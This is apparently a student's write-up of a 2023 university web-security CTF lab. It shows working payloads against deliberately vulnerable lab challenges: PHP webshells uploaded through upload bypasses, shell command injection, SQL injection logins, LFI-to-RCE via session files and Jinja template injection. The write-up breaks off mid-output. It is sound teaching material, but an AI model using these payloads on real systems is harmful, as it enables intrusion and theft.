---
title: '[Web-lab] Computer Security 2023 Fall Course'
disqus: hackmd
---

[Web-lab] Computer Security 2023 Fall Course
===


[![hackmd-github-sync-badge](https://hackmd.io/nK5-ZqVPRu-W0JquabKfdA/badge)](https://hackmd.io/nK5-ZqVPRu-W0JquabKfdA)

## Table of Contents

[TOC]

# WebSec LAB
**● [[Web] Computer Security 2023 Fall Course Writeup](https://hackmd.io/@CHW/ryPzhx0H6)**

http://h4ck3r.quest/challenges
![image](https://hackmd.io/_uploads/rJlm-4t3UT.png)

# Begineer

## Cat Shop
![image](https://hackmd.io/_uploads/BJMjJ-ASa.png)

http://h4ck3r.quest:8100/

![image](https://hackmd.io/_uploads/rJ_AJZ0r6.png)
● A White Cat: http://h4ck3r.quest:8100/item/5427 \
● A Orange Cat: http://h4ck3r.quest:8100/item/5428 \
... \
● A Evil Cat: http://h4ck3r.quest:8100/item/5431

### Cat Shop Solution
http://h4ck3r.quest:8100/item/5430

![image](https://hackmd.io/_uploads/rkBUl-RB6.png)
(順利進到A FLAG)

直接購買金額不夠
![image](https://hackmd.io/_uploads/H1DvMZ0Ba.png)

#### Burp-Suite
Click Buy!
![image](https://hackmd.io/_uploads/B1AkbbRSp.png)

Edit Cost
```Request
POST /buy HTTP/1.1
Host: h4ck3r.quest:8100
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://h4ck3r.quest:8100
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://h4ck3r.quest:8100/item/5430
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=eyJtb25leSI6NjU1MzQsInN0dWZmIjpbeyIgdCI6WyJGTEFHIiwyMTQ3NDgzNjQ4XX1dfQ.ZXB_MA.T8HAauyyUwvTk_JgmRDRD2Pniqo
Connection: close

item_id=5430&cost=2
```
OR F12
![image](https://hackmd.io/_uploads/BJVQVb0HT.png)


![image](https://hackmd.io/_uploads/r1HQWZCrp.png)

### Get Flag
> **Flag: FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}**

![image](https://hackmd.io/_uploads/rkyIEWRHT.png)

## how2http Shop
![image](https://hackmd.io/_uploads/H122KDCSa.png)
http://h4ck3r.quest:8605/
![image](https://hackmd.io/_uploads/HyMCYDAB6.png)

### how2http Shop Solution
Source Code
```php=
<?php
show_source(__FILE__);

include("flag.php");

if (!empty($_SERVER["HTTP_CLIENT_IP"])){
    $ip = $_SERVER["HTTP_CLIENT_IP"];
} elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
    $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
} else {
    $ip = $_SERVER["REMOTE_ADDR"];
}
if ($_COOKIE['user'] !== 'admin') die("Not admim");

if( $_SERVER["REQUEST_METHOD"] !== "FLAG" ) die("u don't need flag?");


if ($ip === "127.0.0.1") echo $FLAG;
else echo "NOPE!";
?>

Warning: Undefined array key "user" in /var/www/html/index.php on line 13
Not admim
```
題目條件:
● HTTP method 需要使用 FLAG
● Cookie: user=admin
● 來源IP 需要是 localhost

### curl
```command
curl -i -X FLAG http://h4ck3r.quest:8605/ -b user=admin
```
![image](https://hackmd.io/_uploads/HyxZSp_9p.png)
> Response 顯示 "NOPE!"
代表HTTP method 與 Cookie 條件。

接著自訂custom IP
```command
curl -i -X FLAG http://h4ck3r.quest:8605/ -b user=admin --header "X-Forwarded-For: 127.0.0.1"
```
● [Sending CURL request with custom IP](https://unix.stackexchange.com/questions/167077/sending-curl-request-with-custom-ip)
![image](https://hackmd.io/_uploads/HkiGLpOc6.png)

### Get Flag
> **FLAG{b4by_httttp!}**

# Upload
## Image Space 0x01
![image](https://hackmd.io/_uploads/SJp50PCHp.png)

http://h4ck3r.quest:9010
![image](https://hackmd.io/_uploads/ByF1J_AH6.png)



### Image Space 0x01 Solution
Source Code
```php=
<?php
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit; //GET 參數中帶有source，將高亮顯示原始碼
}
?>
<h1>Image Uploader</h1>
<p>Only supports: jpg, jpeg, png</p>
<!-- upload form -->
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="image_file">
    <input type="submit" value="Upload">
</form>
<p>
    <a href="/?source">View Source</a>
</p>
<?php
if (!isset($_FILES['image_file'])) {
    die('Give me a file!'); //檢查是否有檔案
}

$filename = basename($_FILES['image_file']['name']);

$prefix = bin2hex(random_bytes(8)); //生成八位隨機字元
move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}");
//檔名格式為 ${prefix}_${filename}，並且保存到 images/
echo "<img src=\"images/${prefix}_${filename}\">";
?>
```
### Create php with command
> 在HTML表單中，顯示 Only supports: jpg, jpeg, png
> 但是在Source Code中並沒有限制上傳的檔案格式。 

生成0x01.php並塞入command
```php=
 echo '<?php system($_GET["cmd"]); ?>' > 0x01.php
```
(Upload)
![image](https://hackmd.io/_uploads/H1F71uRB6.png)

http://h4ck3r.quest:9010/images/b5dc19c1e4805fb2_0x01.php
![image](https://hackmd.io/_uploads/SyPjk_0Sp.png)
```html=
<br />
<b>Warning</b>:  Undefined array key "cmd" in <b>/var/www/html/images/b5dc19c1e4805fb2_0x01.php</b> on line <b>1</b><br />
<br />
<b>Deprecated</b>:  system(): Passing null to parameter #1 ($command) of type string is deprecated in <b>/var/www/html/images/b5dc19c1e4805fb2_0x01.php</b> on line <b>1</b><br />
<br />
<b>Fatal error</b>:  Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/images/b5dc19c1e4805fb2_0x01.php:1
Stack trace:
#0 /var/www/html/images/b5dc19c1e4805fb2_0x01.php(1): system('')
#1 {main}
  thrown in <b>/var/www/html/images/b5dc19c1e4805fb2_0x01.php</b> on line <b>1</b><br />
```
### Webshell
> view-source:http://h4ck3r.quest:9010/images/b5dc19c1e4805fb2_0x01.php?cmd=ls /

![image](https://hackmd.io/_uploads/ryZ2xORS6.png)
> view-source:h4ck3r.quest:9010/images/b5dc19c1e4805fb2_0x01.php?cmd=cat /flag

![image](https://hackmd.io/_uploads/rJbCx_AS6.png)

### Get Flag
> **Flag: FLAG{upl0ad_t0_pwn!!!}**

![image](https://hackmd.io/_uploads/BJb5MORH6.png)

## Image Space 0x02
![image](https://hackmd.io/_uploads/SJhuDpu9a.png)
http://h4ck3r.quest:9011/
![image](https://hackmd.io/_uploads/ryPqw6_56.png)
### Image Space 0x02 Solution
Source Code
```php=
<?php
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit;
}
?>
<h1>Image Uploader</h1>
<p>Only supports: jpg, jpeg, png</p>
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="image_file">
    <input type="submit" value="Upload">
</form>
<p>
    <a href="/?source">View Source</a>
</p>
<?php
if (!isset($_FILES['image_file'])) {
    die('Give me a file!');
}

$filename = basename($_FILES['image_file']['name']);
$extension = strtolower(explode(".", $filename)[1]);

if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) {
    die("Invalid file extension: $extension.");
}

$prefix = bin2hex(random_bytes(8));
move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}");
echo "<img src=\"/images/${prefix}_${filename}\">";
?>
```

與 Image Space 0x01 相比
**透過explode(".", $filename)，限制檔名需要存在png、jpeg、jpg**

### [● explode(): 將字串按照指定字串切割成陣列](https://richarlin.tw/blog/php-implode_explode/)

### Generate image
與Image Space 0x01 類似
生成0x02.png.php並塞入command
```php=
 echo '<?php system($_GET["cmd"]); ?>' > 0x02.png.php
```
(upload)
![image](https://hackmd.io/_uploads/B1eVOA_9T.png)

http://h4ck3r.quest:9011/images/7ce37e2d55e19b95_0x02.png.php
![image](https://hackmd.io/_uploads/HJ6V_CO9T.png)

### Webshell
>http://h4ck3r.quest:9011/images/7ce37e2d55e19b95_0x02.png.php?cmd=ls

![image](https://hackmd.io/_uploads/rJbhOC_cT.png)
> http://h4ck3r.quest:9011/images/7ce37e2d55e19b95_0x02.png.php?cmd=cat%20/f*

![image](https://hackmd.io/_uploads/BkNmYCOcT.png)

### Get Flag
> **Flag: FLAG{ext3ns10n_ch3ck_f4il3d}**

## Image Space 0x03
![image](https://hackmd.io/_uploads/HkO3tC_9T.png)

http://h4ck3r.quest:9012
![image](https://hackmd.io/_uploads/ByF1J_AH6.png)
### Image Space 0x03 Solution
Source Code
```php=
<?php
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit;
}
?>
<h1>Image Uploader</h1>
<p>Only supports: jpg, jpeg, png</p>
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="image_file">
    <input type="submit" value="Upload">
</form>
<p>
    <a href="/?source">View Source</a>
</p>
<?php
if (!isset($_FILES['image_file'])) {
    die('Give me a file!');
}

$filename = basename($_FILES['image_file']['name']);
$extension = strtolower(explode(".", $filename)[1]);

if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) {
    die("Invalid file extension: $extension.");
}

if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false) {
    die("Invalid file type: " . $_FILES['image_file']['type']);
} //與Image Space 0x02相比，確保上傳檔案試圖像檔。

list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']);
// getimagesize() 檢查上傳的圖片類型，確認是否為有效的圖片
if ($type !== IMAGETYPE_JPEG && $type !== IMAGETYPE_PNG) {
    die("Invalid image type.");
}

$prefix = bin2hex(random_bytes(8));
move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}");
echo "<img src=\"/images/${prefix}_${filename}\">";
?>
```
利用與Image Space 0x02相同作法
另外使用burpsuite在 Request中更改Content-type

### Generate image
### 1.生成0x03.png.php並塞入command
```command
 echo '<?php system($_GET["cmd"]); ?>' > 0x03.png.php
```
(upload)
![image](https://hackmd.io/_uploads/rJapVJKcp.png)
```Request
POST /index.php HTTP/1.1
Host: h4ck3r.quest:9012
Content-Length: 237
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://h4ck3r.quest:9012
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySlsJJBG8RC9r7Ek0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://h4ck3r.quest:9012/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundarySlsJJBG8RC9r7Ek0
Content-Disposition: form-data; name="image_file"; filename="0x03.png.php"
Content-Type: image/png

<?php system($_GET["cmd"]); ?>

------WebKitFormBoundarySlsJJBG8RC9r7Ek0--
```
![image](https://hackmd.io/_uploads/ByJrB1YqT.png)
失敗~~

#### MIME驗證圖像類型、getimagesize()驗證圖片大小
#### [addi]Bypass getimagesize(): exiftool
● [File upload bypass: hackers-grimoire](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
![image](https://hackmd.io/_uploads/r1bcU1Yqa.png)

### 2.exiftool
(0x30.jpeg)
![0x03](https://hackmd.io/_uploads/ByEkYkKcT.jpg)

```command
//使用exiftool將PHP塞入jpeg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' 0x03.jpeg
```
![image](https://hackmd.io/_uploads/SyHQtkF5p.png)
```command
$ file 0x03.jpeg
0x03.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system($_GET["cmd"]); ?>", baseline, precision 8, 430x327, components 3
```
```command
mv 0x03.jpeg 0x30.php.jpeg
```
(upload)
> Invalid file extension: php.
> 再度失敗(檔名)

```command
mv 0x03.jpeg 0x30.jpeg.php
```
(upload)
更改Content-Type: image/jpeg
http://h4ck3r.quest:9012/images/26e44818812bb5c9_0x30.jpeg.php
![image](https://hackmd.io/_uploads/S1sbGftcp.png)
> Parse error: syntax error, unexpected character 0x0F in /var/www/html/images/26e44818812bb5c9_0x30.jpeg.php on line 216
> **PHP 解析到無法辨識的字元**
> 嚴重懷疑是巴斯光年的問題

更換圖檔: 全白png檔(0x30.png)
```command
exiftool -Comment='<?php system($_GET["cmd"]); ?>' 0x03.png
mv 0x03.png 0x30.jpeg.php
```
(upload)
更改Content-Type: image/png
![image](https://hackmd.io/_uploads/HJaQ4fFcT.png)
http://h4ck3r.quest:9012/images/5cf1db38abdbacda_0x30.png.php
![image](https://hackmd.io/_uploads/S1cfSGY5p.png)


### Webshell
> http://h4ck3r.quest:9012/images/5cf1db38abdbacda_0x30.png.php?cmd=cat%20/f*

![image](https://hackmd.io/_uploads/r15_Bft9T.png)

### Get Flag
> **FLAG{byp4ss_all_th3_things}**


# Information Leak
## gitleak
![image](https://hackmd.io/_uploads/H1Yos41La.png)
http://h4ck3r.quest:9000
![image](https://hackmd.io/_uploads/B13ajEyIa.png)

### gitleak Solution
(Click Flag hyperlink) > http://h4ck3r.quest:9000/flag.php
![image](https://hackmd.io/_uploads/H1YIh4kUT.png)

#### ● DotGit Tools
> An extension for checking if .git is exposed in visited websites
> [Chrome-extension](https://chromewebstore.google.com/detail/dotgit/pampamgoihgcedonnphgehgondkhikel?hl=zh-TW)
> [Github](https://github.com/davtur19/DotGit)

![image](https://hackmd.io/_uploads/SyAcnE1UT.png)

(DOWNLOAD)
![image](https://hackmd.io/_uploads/HJzN3u3op.png)
> /.git/logs/refs/heads/master
> ![image](https://hackmd.io/_uploads/Hkc4qK3iT.png)
```head
0000000000000000000000000000000000000000 6cfe38db75ec90126f53088ea87c286c83c1bfb3 splitline <tbsthitw@gmail.com> 1646814195 +0800	commit (initial): Init
6cfe38db75ec90126f53088ea87c286c83c1bfb3 a0228bd6ff968f3eca017125a5434b517ad2a83a splitline <tbsthitw@gmail.com> 1646814226 +0800	commit: Remove flag.
```


### ● git-dumper Tools
> git-dumper http://h4ck3r.quest:9000/  ./git
> ![image](https://hackmd.io/_uploads/B1rwfHkLp.png)
> ls git/ \
> ![image](https://hackmd.io/_uploads/rymFMSk8a.png)

index.php
```php=
Meow? Here is your <a href="./flag.php">Flag</a>.
```
flag.php
```php=
<?php 
// No flag for you!
?>

Flag is in the source code.
```

# Command Injection
## DNS Lookup Tool 🔍
![image](https://hackmd.io/_uploads/HkloMEUl8T.png)
http://h4ck3r.quest:8300/

![image](https://hackmd.io/_uploads/HkjNVIeIT.png)

### DNS Lookup Tool 🔍 Solution
Source Code
```php=
<?php
isset($_GET['source']) and die(show_source(__FILE__, true));
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNS Lookup Tool | Baby</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
</head>

<body>
    <section class="section">
        <div class="container">
            <div class="column is-6 is-offset-3 has-text-centered">
                <div class="box">
                    <h1 class="title">DNS Lookup Tool 🔍</h1>
                    <form method="POST">
                        <div class="field">
                            <div class="control">
                                <input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="<?= $_POST['name'] ?? '' ?>">
                            </div>
                        </div>
                        <button class="button is-block is-info is-fullwidth">
                            Lookup!
                        </button>
                    </form>
                    <br>
                    <?php if (isset($_POST['name'])) : ?>
                        <section class="has-text-left">
                            <p>Lookup result:</p>
                            <pre><?= shell_exec("host '" . $_POST['name'] . "';") ?></pre>
                        </section>
                    <?php endif; ?>
                    <hr>
                    <a id="magic">Magic</a> | <a href="/?source">Source Code</a>
                </div>
                <article class="message is-link is-hidden is-size-4" id="hint">
                    <div class="message-body is-family-monospace">
                        host '<span class="has-text-danger" id="command"></span>';
                    </div>
                </article>
            </div>
        </div>
    </section>

    <script>
        magic.onclick = () => hint.classList.toggle("is-hidden");
        window.onload = hostname.oninput = () => command.textContent = hostname.value;
    </script>
</body>

</html>
```
![image](https://hackmd.io/_uploads/H1SM1De86.png)
(閉合)
> '; ls -al;'

![image](https://hackmd.io/_uploads/SkOnJDxIp.png)
> '; ls -al;cat /f*;'

![image](https://hackmd.io/_uploads/Syae-Dx8T.png)

### Get Flag
> **Flag: FLAG{B4by_c0mmand_1njection!}**

## DNS Lookup Tool 🔍 | WAF
![image](https://hackmd.io/_uploads/r1T7bDgL6.png)
http://h4ck3r.quest:8301/
![image](https://hackmd.io/_uploads/Hyua3ueLp.png)

### DNS Lookup Tool 🔍 | WAF Solution
Source Code
```php=
<?php
isset($_GET['source']) and die(show_source(__FILE__, true));
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNS Lookup Tool | WAF</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
</head>

<body>
    <section class="section">
        <div class="container">
            <div class="column is-6 is-offset-3 has-text-centered">
                <div class="box">
                    <h1 class="title">DNS Lookup Tool 🔍 | WAF Edition</h1>
                    <form method="POST">
                        <div class="field">
                            <div class="control">
                                <input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="<?= $_POST['name'] ?? '' ?>">
                            </div>
                        </div>
                        <button class="button is-block is-info is-fullwidth">
                            Lookup!
                        </button>
                    </form>
                    <br>
                    <?php if (isset($_POST['name'])) : ?>
                        <section class="has-text-left">
                            <p>Lookup result:</p>
                            <pre>
                            <?php
                            $blacklist = ['|', '&', ';', '>', '<', "\n", 'flag'];
                            $is_input_safe = true;
                            foreach ($blacklist as $bad_word)
                                if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false;

                            if ($is_input_safe)
                                system("host '" . $_POST['name'] . "';");
                            else
                                echo "HACKER!!!";
                            ?>
                            </pre>
                        </section>
                    <?php endif; ?>
                    <hr>
                    <a href="/?source">Source Code</a>
                </div>
            </div>
        </div>
    </section>
</body>

</html>
```

▼有黑名單限制
```php
 <?php if (isset($_POST['name'])) : ?>
                        <section class="has-text-left">
                            <p>Lookup result:</p>
                            <pre>
                            <?php
                            $blacklist = ['|', '&', ';', '>', '<', "\n", 'flag'];
```
![image](https://hackmd.io/_uploads/r14f1FxUa.png)
### 利用在上述Command Injection 提到的[Command Substitution](https://hackmd.io/@CHW/ryPzhx0H6#%E5%9C%A8linux-shell-command%E8%A3%A1%E9%9D%A2%EF%BC%8C--%E8%A3%A1%E9%9D%A2%E6%98%AF%E5%8F%AF%E4%BB%A5%E5%9F%B7%E8%A1%8CCommand)
> '"$(ls)"'

![image](https://hackmd.io/_uploads/BJrDeYeUa.png)
> 原理: "host '" . $ _POST['name'] . "';"
>  "host' **'"$(ls)"'** "';" 閉合前後單引號加Command Substitution

> '"$(cat /f*)"'

![image](https://hackmd.io/_uploads/SJIDWYxLa.png)
![image](https://hackmd.io/_uploads/rkX5hptIp.png)


### Get Flag
> escape 拔掉
> **FLAG{Y0U_(Byp4ssed)_th3_`waf`}**

# SQL Injection
## Log me in
![image](https://hackmd.io/_uploads/S1EsKTKIp.png)
http://h4ck3r.quest:8200/
![image](https://hackmd.io/_uploads/H1M6t6F8a.png)
### Log me in Solution
> usrname: chw' or 1=1 )--
> chw (隨意)

![image](https://hackmd.io/_uploads/HkkDqTFL6.png)
(Login)
![image](https://hackmd.io/_uploads/SkXn9aYLp.png)

### or 1=1 -- 可能會被IPS擋掉
![image](https://hackmd.io/_uploads/BybBg0KU6.png)


### Get Flag
> **FLAG{b4by_sql_inj3cti0n}**

## Log me in: Revenge
![image](https://hackmd.io/_uploads/BJxrJRYIp.png)
> Hint: union syntax

http://h4ck3r.quest:8201/
![image](https://hackmd.io/_uploads/HJML1RY86.png)

### Log me in: Revenge Solution
Source Code
```python=
from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/database.db')
        db.row_factory = sqlite3.Row
    return db


@app.before_first_request
def init_db():
    cursor = get_db().cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS "admin" (
        "username"  TEXT NOT NULL,
        "password"  TEXT NOT NULL
    )
    """)
    cursor.execute("SELECT COUNT(*) as count FROM admin WHERE username='admin'")
    count = cursor.fetchone()['count']
    if count == 0:
        import secrets
        cursor.execute("INSERT INTO admin (username, password) VALUES (?,?)",
                       ('admin', secrets.token_urlsafe()))
    #檢查Username是不是admin，query出來結果的password跟輸入的password要一樣
        get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.route("/")
def home():
    return render_template("index.html",
                           failed=request.args.get('failed') != None)


@app.route("/login", methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return redirect("/?failed")

    cur = get_db().execute(f"SELECT * FROM admin WHERE (username='{username}')")
    res = cur.fetchone()
    cur.close()

    if res['username'] == 'admin' and res['password'] == password:
        return "FLAG: FLAG{<REDACTED>}"

    return redirect("/?failed")



@app.route("/source")
def source():
    import re
    source_code = open(__file__).read()
    source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{<REDACTED>}', source_code, 1)
    return Response(source_code, mimetype='text/plain')


if __name__ == '__main__':
    app.run(debug=True)
```

### UNION based SELECT
根據Source Code 28行，Username的結果和password需要一樣
> usrname:xxxxx' ) union SELECT 'admin','chw' --
> password: chw

![image](https://hackmd.io/_uploads/HyKhkmFqp.png)

### Get Flag
![image](https://hackmd.io/_uploads/r1tlxXK5a.png)
> **FLAG{un10n_bas3d_sqli}**

## Cat Emoji DB
![image](https://hackmd.io/_uploads/SyJWZmY5p.png)
http://h4ck3r.quest:9487/
![image](https://hackmd.io/_uploads/BJbLmXK9a.png)

### Cat Emoji DB Solution
Source Code
```python=
from flask import Flask, request, redirect, jsonify, send_file
import re

# db.py: not provided
from db import db

app = Flask(__name__)


@app.before_request
def fix_path():
    # trim all the whitespace from path
    trimmed = re.sub('\s+', '', request.path)
    if trimmed != request.path:
        return redirect(trimmed)


@app.route('/')
def index():
    return send_file('index.html')


@app.route('/api/all')
def emojis():
    cursor = db().cursor()
    cursor.execute("SELECT Name FROM Emoji")
    return jsonify(cursor.fetchall())


@app.route('/api/emoji/<unicode>')
def api(unicode):
    cursor = db().cursor()
    cursor.execute("SELECT * FROM Emoji WHERE Unicode = %s" % unicode)
    row = cursor.fetchone()
    if row:
        return jsonify({'data': row})
    else:
        return jsonify({'error': 'Cat emoji not found'})


@app.route('/source')
def source():
    return send_file(__file__, mimetype='text/plain')
```

# LFI
## HakkaMD
![image](https://hackmd.io/_uploads/rJWJnY2ja.png)
http://h4ck3r.quest:8401
![image](https://hackmd.io/_uploads/rJxWnKhia.png)

### HakkaMD Solution
1. 筆記列表
http://h4ck3r.quest:8401/?module=module/list.php
![image](https://hackmd.io/_uploads/BktEhKhoT.png)
2. phpinfo()
http://h4ck3r.quest:8401/phpinfo.php
![image](https://hackmd.io/_uploads/H1gw2Fhop.png)

#### Attempt
> chwchw

![image](https://hackmd.io/_uploads/SJKLTFho6.png)
![image](https://hackmd.io/_uploads/SJmvpFho6.png)

#### 1. phpinfo()查看筆記存放位置
![image](https://hackmd.io/_uploads/Hk6yGqnjp.png)
> 預設路徑

#### 2. 確認session存放路徑
![image](https://hackmd.io/_uploads/H1I4fcnsp.png)

● [[PHP]session.save_path string](https://www.php.net/manual/en/session.configuration.php): session.save_path defines the argument which is passed to the save handler.

```URL
http://h4ck3r.quest:8401/?module=/tmp/sess_282b79577d641fef89940fb2f2a5b371
```
![image](https://hackmd.io/_uploads/Hyh8Gq3i6.png)
> 成功
> LFI可從session下手

### Insert Web shell
```php
<?php system($_GET['cmd']); ?>
```
![image](https://hackmd.io/_uploads/BkRYk92o6.png)
```URL
http://h4ck3r.quest:8401/?module=/tmp/sess_282b79577d641fef89940fb2f2a5b371&cmd=ls%20/
```
![image](https://hackmd.io/_uploads/H1-vmq3jT.png)

### Get Flag
```URL
http://h4ck3r.quest:8401/?module=/tmp/sess_282b79577d641fef89940fb2f2a5b371&cmd=cat%20/flag_aff6136bbef82137
```
![image](https://hackmd.io/_uploads/rkcN493ip.png)
> **FLAG{include(LFI_to_RCE)}**

## My First Meow Website
![image](https://hackmd.io/_uploads/BkVt853sa.png)
http://h4ck3r.quest:8400/
![image](https://hackmd.io/_uploads/S1CcIqhi6.png)


### My First Meow Website Solution
1. Home:
http://h4ck3r.quest:8400/?page=inc/home
![image](https://hackmd.io/_uploads/ByryyohjT.png)
2. About:
http://h4ck3r.quest:8400/?page=inc/about
![image](https://hackmd.io/_uploads/BklL_yo3sp.png)
3. Admin:
http://h4ck3r.quest:8400/admin.php
![image](https://hackmd.io/_uploads/r1Rwxi3oa.png)
admin/admin Login
```URL
http://h4ck3r.quest:8400/admin.php?username=admin&password=admin
```
> Sqlmap 被擋掉
![image](https://hackmd.io/_uploads/ry-MuT2sa.png)


#### Attempt

```URL
http://h4ck3r.quest:8400/?page=inc/chw
```
![image](https://hackmd.io/_uploads/HJyRgsnja.png)


# SSTI
## Jinja
![image](https://hackmd.io/_uploads/ryKivy5LT.png)
http://h4ck3r.quest:8700/
![image](https://hackmd.io/_uploads/ByHpw1qIp.png)
> chw

![image](https://hackmd.io/_uploads/rypAwJ9Ip.png)

### Jinja Solution
Source Code
```pyhton=
from flask import Flask, render_template_string, request, send_file

app = Flask(__name__)


@app.get("/")
def home():
    return render_template_string("""
    <form method="POST">
        <input type="text" name="name" placeholder="Your name">
        <button>submit</button>
    </form>
    <p><a href="/source">Source code</a></p>
    """)


@app.post("/")
def welcome_message():
    name = request.form.get('name')
    return render_template_string("<p>Hello, " + name + "</p>")


@app.get("/source")
def source():
    return send_file(__file__, mimetype="text/plain")


if __name__ == '__main__':
    app.run(threaded=True, debug=True)
```
> {{ 7*7 }}

![image](https://hackmd.io/_uploads/SkyXuJ586.png)
> {{config}}

![image](https://hackmd.io/_uploads/S17gYk98T.png)
> {{ ().__ class__.__ base__.__ subclasses__() }}

```
Hello, [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 